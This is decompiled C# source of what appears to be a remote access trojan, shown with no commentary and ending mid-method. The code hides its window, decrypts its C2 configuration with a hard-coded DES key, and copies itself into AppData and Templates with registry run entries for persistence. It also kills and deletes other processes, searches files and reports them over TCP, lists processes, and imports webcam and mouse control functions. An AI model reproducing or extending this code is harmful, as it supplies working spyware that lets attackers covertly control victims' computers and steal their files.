using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Printing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using nbBC5z6UyEsRVOl4;
using ns0;
using ooM51FgENAIQr5W0;
using u8JxxivqeqMnl0R2;

[DesignerGenerated]
public class MainFrm : Form
{
	private IContainer m00a010;

	[AccessedThroughProperty("ServiceController1")]
	private ServiceController serviceController_0;

	private bool rf3x912;

	private bool hqutK13;

	private bool bool_0;

	private int UZi4a15;

	private int hnBPo16;

	private int m2S1q17;

	private int KF80W18;

	private string Vz2fN19;

	private string ZSbMq20;

	private string jjJf521;

	private string string_0;

	private string string_1;

	private string fys2Z24;

	private string nTGlZ25;

	private int kX3ha26;

	private int pbPo527;

	private TcpClient tcpClient_0;

	private NetworkStream Tryrp8M3qDof29;

	private StreamWriter L7lFgASOP4LW30;

	private StreamReader VxHEEbFtIY3B31;

	private Process JJZ33lEpUnad32;

	private StringBuilder Z2rpZswPGBwS33;

	private int r7oeXVwN4KWw34;

	private int BOLtpl2xntEB35;

	private long KftfreU7d6BV36;

	private short XprZQm9f6UOa37;

	private byte[] H3plzYvXsMtH38;

	private FileStream rhlPPOjudPwZ39;

	private FileStream T2G0jpvQriyo40;

	private BinaryWriter OzyeBEsaWJxz41;

	private BinaryReader binaryReader_0;

	private int ivD3hCg9IW0f43;

	private long g5Tyml3av6ZZ44;

	private long Zdg7kHRo81V645;

	private string string_2;

	private MessageBoxIcon qpubmg0bvD3347;

	private MessageBoxButtons m8O05B7e9NyW48;

	private string sJH7eUGPcLHV49;

	private string cF1R1JAmmPWk50;

	private string yQZH2MlCQxJC51;

	private Point zSXBXdRArTNp52;

	private Rectangle AgdpdbADNmzn53;

	private const int SC_SCREENSAVE = 61760;

	private const int HWND_BROADCAST = 65535;

	private const int WM_SYSCOMMAND = 274;

	public const long M = 1L;

	public const long MONITOR_ON = -1L;

	public const int MONITOR_OFF = 2;

	private const int SC_MONITORPOWER = 61808;

	private const short WM_CAP = 1024;

	private const int WM_CAP_COPY = 1054;

	private const int WM_CAP_DRIVER_CONNECT = 1034;

	private const int WM_CAP_DRIVER_DISCONNECT = 1035;

	private const int WM_CAP_EDIT_COPY = 1054;

	private const int WM_CAP_GET_FRAME = 1084;

	private int VYNpq44FWoh854;

	private IDataObject MYo9XmTF255;

	private Image z7MzVpFX656;

	private ManagementObjectSearcher PdjzFYpsa57;

	private string mO8tbY4Ce58;

	private string MqGrtTlmR59;

	private string string_3;

	private const int MOUSEEVENTF_ABSOLUTE = 32768;

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_MOVE = 1;

	private const int MOUSEEVENTF_MIDDLEDOWN = 32;

	private const int MOUSEEVENTF_MIDDLEUP = 64;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	private string[] OdjpJubwQ61;

	private string[] U5VNuibSw62;

	private string[] qoKqej7nD63;

	private Thread FHpqDCUfp64;

	private string UmGbfW2rg65;

	private string[] Vdkctxaqa66;

	private int[] koZZimRwP67;

	private const long MB_DEFBUTTON1 = 0L;

	private const long MB_DEFBUTTON2 = 256L;

	private TcpClient rtsjTeTgv68;

	private NetworkStream Qe9NnM2ba69;

	private StreamWriter isdSfdsAR70;

	private StreamReader qV4kjI6BX71;

	private Thread OCk5jd1kb72;

	private TcpClient tcpClient_1;

	private NetworkStream CydfRjnsl74;

	private StreamWriter qvUqHLPez75;

	private StreamReader Pc90QV1r376;

	private Thread PdXX8KEu277;

	private TcpClient KyK1HQRAP78;

	private NetworkStream gzPfnIwmm79;

	private StreamWriter UCIidqfxf80;

	private StreamReader nsmaMcI4FOOuj8f581;

	private Thread LRezQfqMoKSkslkL82;

	private TcpClient aAu7s6NCxj2IxRAt83;

	private NetworkStream scsy1Yp71AM1knCk84;

	private StreamWriter t3kID8CF3C2xcIew85;

	private StreamReader streamReader_0;

	private Thread GIeuxSQkzNvoVRUj87;

	private TcpClient mfRWvmrHi8wh2Klh88;

	private NetworkStream kTQuuJZhyyF6glgk89;

	private StreamWriter rMv3UlEkhwbomyiO90;

	private StreamReader se421qOCgAnWGlrX91;

	private Thread ScPffhmZevdYxAVZ92;

	private TcpClient gRD2hdi1YTNjXHDW93;

	private NetworkStream networkStream_0;

	private StreamWriter FoFPHpFETOhmu31w95;

	private StreamReader ShTj4LgdhsacpMO796;

	private Thread O6Dz1OeFyRfULdGO97;

	private TcpClient tcpClient_2;

	private NetworkStream Z9xnpsv42dLdvmr399;

	private StreamWriter Ll989T93vJrzf0q5100;

	private StreamReader B8UCFjpALzSK0noL101;

	private Thread thread_0;

	private TcpClient NFCnrPosVzmA1p38103;

	private NetworkStream lGzLywLvbOBbsKzQ104;

	private StreamWriter KPXkL1ja60YKJn4A105;

	private StreamReader rIkkl3ugU6cDddZb106;

	private Thread ZwPbsInkmpFxy1LO107;

	private TcpClient K1JJqeuHlGpEOGWT108;

	private NetworkStream networkStream_1;

	private StreamWriter WITkoSctfLL18110;

	private StreamReader QLjIvGsLwLgyg111;

	private Thread SS0oqgyjoYwkq112;

	private TcpClient NJpL1Ycp1npDu113;

	private NetworkStream htCpWCM7ZktRl114;

	private StreamWriter vtOrMMo4SJmLK115;

	private StreamReader hmRQvBKWY4HZ2116;

	private Thread TyjNpWTGtJAzA117;

	private TcpClient CfpoKfEclpg9P118;

	private NetworkStream R6owo7sKTQL5j119;

	private StreamWriter qR3OCggUYvwAj120;

	private StreamReader rkQy82Ez4MhWk121;

	private Thread t7QJpDjqPM8xM122;

	private TcpClient ZSVTBSW5G7UlH123;

	private NetworkStream IqJl4MRiN93e6124;

	private StreamWriter SgSByH0l3MEab125;

	private StreamReader oZfNZWoHVTHuH126;

	private Thread lFucIREuZGc4z127;

	private TcpClient ckmFD5aTnR3097QpXnb7128;

	private NetworkStream QllQR3NwGpj2IqJ3kffC129;

	private StreamWriter jOYNqbyKN52i1XIQYvOz130;

	private StreamReader hEcYx1iJnN4H8zN2nxpF131;

	private Thread v3IAn10LHT4OrFkFB0fp132;

	private TcpClient TPm01kas9Ftr684eVBAw133;

	private NetworkStream networkStream_2;

	private StreamWriter QyB2pDIjA5KZpJpmNSiL135;

	private StreamReader streamReader_1;

	private Thread xXS9nrYyApSOpNZ9lzOj137;

	private TcpClient tCWcxwXR3WqONce6P3EM138;

	private NetworkStream networkStream_3;

	private StreamWriter u6uEY40dzTkhV1bR7ZGM140;

	private StreamReader IIixP4D3Bk58rMi17RYr141;

	private Thread KAFFbQr9yKM0ZP8MNXOU142;

	private TcpClient rXBeNbP8JaKg1e282DlZ143;

	private NetworkStream DtuQx59CEvda240MYrS0144;

	private StreamWriter streamWriter_0;

	private StreamReader streamReader_2;

	private Thread thread_1;

	private TcpClient i0wwQ8ofQWUnTFBEmOsT148;

	private NetworkStream networkStream_4;

	private StreamWriter EimR8Vj3xjq0KynhQlAT150;

	private StreamReader hNSFr3KrWwN20PeIDj20151;

	private Thread CN33Ju644revJUlRqHp4152;

	private TcpClient bS71wo0VkEExizhtJOVX153;

	private NetworkStream XFnvhhj5tmiWUXOKG2xl154;

	private StreamWriter tbKpNHc155;

	private StreamReader streamReader_3;

	private Thread thread_2;

	private TcpClient UrXmHDk158;

	private NetworkStream LxMHgzt159;

	private StreamWriter MUXIz59160;

	private int sBeGasQ161;

	private string if5ijhy162;

	private Mutex JN254So163;

	private Thread thread_3;

	private string BxTa9Vs165;

	private bool QIGwaut166;

	private bool iHoXiV2167;

	private bool bool_1;

	private int wNlYuvH169;

	private int Hb89l6T170;

	private List<Rectangle> list_0;

	private int[] n2nT2it172;

	private string CgFWa5k173;

	private int VkyGYMA174;

	private int wgNWP93175;

	private bool y3AOPy8176;

	private string LY5rdd5177;

	private int Utdb0z920dp9dRMzWd8p4d47178;

	internal virtual ServiceController ServiceController1
	{
		get
		{
			return serviceController_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			serviceController_0 = value;
		}
	}

	private string Manufacturer => mO8tbY4Ce58;

	private string Model => MqGrtTlmR59;

	private string WindowsDirectory => string_3;

	public MainFrm()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Shown((EventHandler)MainFrm_Shown);
		((Form)this).add_FormClosing(new FormClosingEventHandler(MainFrm_FormClosing));
		rf3x912 = false;
		UZi4a15 = 0;
		r7oeXVwN4KWw34 = 32768;
		BOLtpl2xntEB35 = 65536;
		H3plzYvXsMtH38 = new byte[0];
		yQZH2MlCQxJC51 = Conversions.ToString(Environment.OSVersion.Version.Major);
		AgdpdbADNmzn53 = Screen.get_PrimaryScreen().get_Bounds();
		UmGbfW2rg65 = "";
		Vdkctxaqa66 = new string[4] { "Default", "90", "180", "270" };
		koZZimRwP67 = new int[4] { 0, 1, 2, 3 };
		QIGwaut166 = false;
		iHoXiV2167 = false;
		bool_1 = false;
		checked
		{
			wNlYuvH169 = (int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0);
			Hb89l6T170 = (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0);
			list_0 = new List<Rectangle>();
			n2nT2it172 = new int[17];
			CgFWa5k173 = null;
			VkyGYMA174 = 0;
			y3AOPy8176 = false;
			z62xbb6cwrJk2l9xCTVs9JO86();
		}
	}

	[STAThread]
	public static void eqrbbGNcr8mneYHe6jFNEpY85()
	{
		Application.Run((Form)(object)new MainFrm());
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			if (disposing && m00a010 != null)
			{
				m00a010.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void z62xbb6cwrJk2l9xCTVs9JO86()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		new ComponentResourceManager(typeof(MainFrm));
		ServiceController1 = new ServiceController();
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		Padding margin = default(Padding);
		((Padding)(ref margin))._002Ector(18, 39, 18, 39);
		((Form)this).set_Margin(margin);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("MainFrm");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int hwndCallback);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, int dwStyle, int x, int y, int nWidth, short nHeight, int hWndParent, int nID);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciExecute([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr hwnd, IntPtr hWndChild, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindow);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool IsWindowVisible(IntPtr hwnd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SwapMouseButton(long bSwap);

	private void MainFrm_Shown(object sender, EventArgs e)
	{
		try
		{
			uqpHzbxjkt122(5);
			JN254So163 = new Mutex(initiallyOwned: false, rWthKh16.jiGPsB40());
			if (!JN254So163.WaitOne(0, exitContext: false))
			{
				JN254So163.Close();
				JN254So163 = null;
				ProjectData.EndApp();
			}
			((Control)this).set_Visible(false);
			string_1 = jjzGIyjqEz113(rWthKh16.smethod_0(), "12345#$%");
			if5ijhy162 = string_1;
			fys2Z24 = jjzGIyjqEz113(rWthKh16.duolt638(), "12345#$%");
			kX3ha26 = rWthKh16.H2zDEy37();
			sBeGasQ161 = kX3ha26;
			pbPo527 = rWthKh16.smethod_1();
			uqpHzbxjkt122(1);
			if ((Operators.CompareString(if5ijhy162, (string)null, false) == 0) | (sBeGasQ161 == 0))
			{
				Environment.Exit(0);
			}
			else
			{
				try
				{
					method_1();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					Thread thread = new Thread(M34UTUAEOq107);
					thread.Start();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				FHpqDCUfp64 = new Thread(qnFws211);
				FHpqDCUfp64.Start();
				try
				{
					Thread thread2 = new Thread(PavrWwuJgR101);
					thread2.Start();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			KF80W18 = ((Control)this).get_Handle().ToInt32();
			TK6FufxCeABTjTkCW151();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			Environment.Exit(0);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("dnsapi.dll")]
	private static extern uint DnsFlushResolverCache();

	private void PavrWwuJgR101()
	{
		while (true)
		{
			uqpHzbxjkt122(1800);
			try
			{
				if (!tcpClient_0.Connected)
				{
					DnsFlushResolverCache();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	private string YUUzZXOziU104()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private void ULAMoFZZXG105(object currentDirectory)
	{
		checked
		{
			try
			{
				if (!hqutK13)
				{
					return;
				}
				OdjpJubwQ61 = Directory.GetDirectories(Conversions.ToString(currentDirectory));
				U5VNuibSw62 = Directory.GetFiles(Conversions.ToString(currentDirectory));
				string[] u5VNuibSw = U5VNuibSw62;
				foreach (string text in u5VNuibSw)
				{
					if (qoKqej7nD63[1].StartsWith("*"))
					{
						string[] array = qoKqej7nD63[1].Split(new char[1] { '.' });
						if (text.EndsWith(array[array.Length - 1]))
						{
							qR3OCggUYvwAj120.WriteLine("/SEARCHFL/" + text + "¦" + Conversions.ToString(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().GetFileInfo(text).Length));
							qR3OCggUYvwAj120.Flush();
						}
					}
					else
					{
						string[] array2 = text.Split(new char[1] { '\\' });
						if (array2[array2.Length - 1].Contains(qoKqej7nD63[1]))
						{
							qR3OCggUYvwAj120.WriteLine("/SEARCHFL/" + text + "¦" + Conversions.ToString(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().GetFileInfo(text).Length));
							qR3OCggUYvwAj120.Flush();
						}
					}
				}
				string[] odjpJubwQ = OdjpJubwQ61;
				foreach (string text2 in odjpJubwQ)
				{
					if (!(text2.Substring(3).StartsWith("WINDOWS") | text2.Substring(3).StartsWith("WINNT")))
					{
						ULAMoFZZXG105(text2);
					}
				}
				OdjpJubwQ61 = null;
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(currentDirectory, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)3, false))
				{
					qR3OCggUYvwAj120.WriteLine("/SEARCHFL/SEARCHEND");
					qR3OCggUYvwAj120.Flush();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private ImageCodecInfo SEjDuRfgKU106(string mimeType)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = imageEncoders.Length;
		int num2 = 0;
		while (true)
		{
			if (num2 <= num)
			{
				if (Operators.CompareString(imageEncoders[num2].get_MimeType(), mimeType, false) == 0)
				{
					break;
				}
				num2 = checked(num2 + 1);
				continue;
			}
			return null;
		}
		return imageEncoders[num2];
	}

	private void M34UTUAEOq107()
	{
		try
		{
			uqpHzbxjkt122(5);
			IxOn7RGGTt110();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private object method_0(string ProcessName)
	{
		Process process = new Process();
		Process[] processesByName = Process.GetProcessesByName(ProcessName);
		IEnumerator enumerator = default(IEnumerator);
		for (int i = 0; i < processesByName.Length; i = checked(i + 1))
		{
			process = processesByName[i];
			try
			{
				try
				{
					enumerator = process.Modules.GetEnumerator();
					if (!enumerator.MoveNext())
					{
						continue;
					}
					ProcessModule processModule = (ProcessModule)enumerator.Current;
					return processModule.FileName!.ToString();
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		return null;
	}

	private void method_1()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(method_0(process.ProcessName))).Length <= 100000L)
					{
						continue;
					}
					double num = double.Parse(FileVersionInfo.GetVersionInfo(Conversions.ToString(method_0(process.ProcessName))).ProductVersion);
					if (num == 3.0 || num == 3.1 || num == 3.2 || num == 3.3 || num == 3.4 || num == 3.5)
					{
						try
						{
							process.Kill();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						uqpHzbxjkt122(2);
						try
						{
							((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().DeleteFile(Conversions.ToString(method_0(process.ProcessName)));
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					else if (num == 3.7)
					{
						Environment.Exit(0);
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void IxOn7RGGTt110()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())))
			{
				try
				{
					byte[] array = ((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().ReadAllBytes(Application.get_ExecutablePath());
					try
					{
						((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath()), array, false);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						uqpHzbxjkt122(1);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath()), array, false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			uqpHzbxjkt122(2);
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())) && Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey(jjzGIyjqEz113(rWthKh16.SMXyxg41(), "12345#$%"), writable: false)!.GetValue(jjzGIyjqEz113(rWthKh16.xHlGjs42(), "12345#$%")), (object)(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())), false))))
				{
					((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey(jjzGIyjqEz113(rWthKh16.SMXyxg41(), "12345#$%"), writable: true)!.SetValue(jjzGIyjqEz113(rWthKh16.xHlGjs42(), "12345#$%"), Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath()));
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			uqpHzbxjkt122(1);
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath())) && Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey(jjzGIyjqEz113(rWthKh16.SMXyxg41(), "12345#$%"), writable: false)!.GetValue(jjzGIyjqEz113(rWthKh16.UBlmIw43(), "12345#$%")), (object)(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath())), false))))
				{
					((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey(jjzGIyjqEz113(rWthKh16.SMXyxg41(), "12345#$%"), writable: true)!.SetValue(jjzGIyjqEz113(rWthKh16.UBlmIw43(), "12345#$%"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath()));
				}
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	private void MainFrm_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			IxOn7RGGTt110();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string v6pJR2A5qz112(string strText, string strEncrKey)
	{
		byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(strEncrKey, 8));
			byte[] bytes2 = Encoding.UTF8.GetBytes(strText);
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(bytes2, 0, bytes2.Length);
			cryptoStream.FlushFinalBlock();
			return Convert.ToBase64String(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string jjzGIyjqEz113(string strText, string sDecrKey)
	{
		try
		{
			byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
			byte[] array = new byte[checked(strText.Length + 1)];
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(sDecrKey, 8));
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			array = Convert.FromBase64String(strText);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			Encoding uTF = Encoding.UTF8;
			return uTF.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void YGfmWIyWpK114()
	{
		try
		{
			rhlPPOjudPwZ39.Close();
			binaryReader_0.Close();
			OzyeBEsaWJxz41 = null;
			T2G0jpvQriyo40 = null;
			binaryReader_0 = null;
			rhlPPOjudPwZ39 = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool s33fCB75w5115(ref string FileName)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 53:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				flag = (FileSystem.GetAttr(FileName) & 0x10) == 0;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 53;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private string gBfjaKLuO0116(ref string Temp)
	{
		try
		{
			string result = null;
			int num = Strings.Len(Temp);
			for (int i = 1; i <= num; i = checked(i + 1))
			{
				string text = Strings.Mid(Temp, i, 1);
				if (Operators.CompareString(text, "*", false) == 0)
				{
					break;
				}
				result = Strings.Mid(Temp, 1, i);
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result2 = null;
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	private string qqSDQOR3N9117()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			string text = null;
			Process[] array = processes;
			foreach (Process process in array)
			{
				string text2 = process.ProcessName + "*";
				text2 = text2 + process.Id + "*";
				text2 = text2 + process.BasePriority + "*";
				text2 += process.WorkingSet64;
				text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "$" + text2) : text2);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private string tDGG7fgk47118()
	{
